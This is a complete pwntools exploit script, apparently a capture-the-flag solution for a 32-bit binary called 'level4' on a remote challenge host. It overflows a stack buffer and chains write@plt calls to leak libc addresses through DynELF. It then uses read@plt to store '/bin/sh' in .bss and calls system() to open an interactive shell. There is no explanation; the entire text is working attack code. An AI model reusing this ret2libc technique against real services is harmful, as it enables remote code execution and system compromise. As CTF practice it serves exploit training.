from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10248)
elf = ELF('./level4')
main_addr = elf.symbols['main']  # 0x8048470
write_plt = elf.plt['write']  # 0x8048340
read_plt = elf.plt['read']  # 0x8048310
bss_addr = elf.bss()  # 0x804a024
padding = b'a'*(0x88+0x4)

def leak(address):
    payload = padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    leaked = io.recv(4)
    log.info("[%#x] => %s = %s" % (address, repr(leaked), hex(u32(leaked))))
    return leaked


libc = DynELF(leak, elf=elf)
system_addr = libc.lookup('system', 'libc')
log.success('system_address => %#x' % system_addr)
payload = padding + p32(read_plt) + p32(main_addr) + p32(0) + p32(bss_addr) + p32(8)
io.send(payload)
io.send('/bin/sh\x00')
payload = padding + p32(system_addr) + p32(main_addr) + p32(bss_addr)
io.sendline(payload)
io.interactive()
